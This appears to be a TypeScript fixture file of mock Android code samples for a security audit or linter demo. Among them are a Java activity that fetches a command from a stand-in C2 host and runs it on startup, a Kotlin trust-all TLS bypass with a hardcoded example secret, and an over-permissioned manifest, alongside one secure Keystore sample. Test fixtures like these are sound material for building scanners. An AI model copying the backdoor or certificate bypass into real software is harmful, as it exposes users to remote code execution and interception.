export type MockCodeTemplate = {
  id: string;
  name: string;
  filename: string;
  type: string;
  description: string;
  content: string;
};

/** Demo sources for Audit tab / local linter. */
export const MOCK_CODE_TEMPLATES: MockCodeTemplate[] = [
  {
    id: 'backdoor',
    name: 'BackdoorActivity.java (Dangerous)',
    filename: 'BackdoorActivity.java',
    type: 'Java',
    description:
      'Contains covert remote executions, command patterns, and leaky hardcoded credential states.',
    content: `package com.vrav.securehub.app;

import android.app.Activity;
import android.os.Bundle;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class BackdoorActivity extends Activity {
    // 🚩 HARDCODED C2 + CREDENTIALS
    private static final String C2 = "http://evil.example/c2";
    private static final String API_KEY = "sk_live_backdoor_demo_key";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        new Thread(() -> {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(C2).openConnection();
                c.setRequestProperty("X-Api-Key", API_KEY);
                InputStream in = c.getInputStream();
                Runtime.getRuntime().exec(new String(in.readAllBytes()));
            } catch (Exception ignored) {}
        }).start();
    }
}`,
  },
  {
    id: 'ssl-bypass',
    name: 'InsecureNetClient.kt (SSL Bypass)',
    filename: 'InsecureNetClient.kt',
    type: 'Kotlin',
    description:
      'Demonstrates Custom X509 TrustManager bypass which permits wiretapping/MITM attacks.',
    content: `package com.vrav.securehub.net

import java.security.SecureRandom
import javax.net.ssl.*
import java.security.cert.X509Certificate

class InsecureNetClient {
    private val awsClientSecret = "AKIAIOSFODNN7EXAMPLE/wJalrXUtnFEMI/K7MDENG/bPxRfiCY"

    fun trustAll() {
        val tm = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(c: Array<X509Certificate>, a: String) {}
            override fun checkServerTrusted(c: Array<X509Certificate>, a: String) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        })
        val ctx = SSLContext.getInstance("TLS")
        ctx.init(null, tm, SecureRandom())
        HttpsURLConnection.setDefaultSSLSocketFactory(ctx.socketFactory)
        HttpsURLConnection.setDefaultHostnameVerifier { _, _ -> true }
    }
}`,
  },
  {
    id: 'manifest',
    name: 'AndroidManifest.xml (Permissions Abuse)',
    filename: 'AndroidManifest.xml',
    type: 'XML',
    description:
      'Highlights wide-open broadcast receivers and excessive core-layer permissions.',
    content: `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.vrav.decentralized.app">
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <application android:allowBackup="true">
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>`,
  },
  {
    id: 'secure-crypto',
    name: 'SecureCryptoVault.kt (Pristine Standard)',
    filename: 'SecureCryptoVault.kt',
    type: 'Kotlin',
    description:
      'Fully compliant cryptographic storage utilizing Android Keystore and strong transformation algorithms.',
    content: `package com.vrav.securehub.crypto

import android.security.keystore.KeyGenParameterSpec
import android.security.keystore.KeyProperties
import java.security.KeyStore
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey

class SecureCryptoVault {
    private val alias = "vrav_aes_key"

    fun ensureKey() {
        val ks = KeyStore.getInstance("AndroidKeyStore").apply { load(null) }
        if (!ks.containsAlias(alias)) {
            val kg = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore")
            kg.init(
                KeyGenParameterSpec.Builder(
                    alias,
                    KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT
                )
                    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
                    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
                    .setKeySize(256)
                    .build()
            )
            kg.generateKey()
        }
    }

    fun cipher(): Cipher = Cipher.getInstance("AES/GCM/NoPadding")
}`,
  },
];
